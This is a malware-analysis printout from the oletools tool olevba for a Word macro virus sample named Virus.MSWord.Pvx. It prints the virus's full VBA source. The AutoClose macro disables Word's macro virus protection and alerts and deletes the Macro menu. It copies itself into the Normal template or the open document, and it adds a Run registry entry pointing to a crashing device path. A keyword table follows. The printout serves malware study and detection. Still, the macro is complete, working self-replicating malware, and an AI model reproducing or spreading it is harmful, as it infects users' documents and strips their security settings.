olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pvx
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pvx - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO expB2.bas 
in file: Virus.MSWord.Pvx - OLE stream: 'Macros/VBA/expB2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Options.VirusProtection = (Rnd * 0)
Options.SaveNormalPrompt = (Rnd * 0)
Application.EnableCancelKey = wCancelDisabled
Application.DisplayStatusBar = (Rnd * 0)
Application.ScreenUpdating = (Rnd * 0)
Application.DisplayAlerts = wdAlertsNone
CommandBars("Tools").Controls("Macro").Delete

Application.VBE.ActiveVBProject.VBComponents("expB2").Export "c:\log.386"
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "expB2" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "expB2" Then ActivInstall = True
Next I
If ActivInstall = True And NormInstall = False Then Set Dobj = NormalTemplate.VBProject _
Else: If ActivInstall = False And NormInstall = True Then Set Dobj = ActiveDocument.VBProject
Dobj.VBComponents.Import ("c:\log.386")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If Day(17) And Month(Now) Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "") = "c:\con\con"
End If
End Sub
' @ Pvx 17 4 2000 simple m.v. only for research purposes
' version b5 (word97)         dont distribute





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

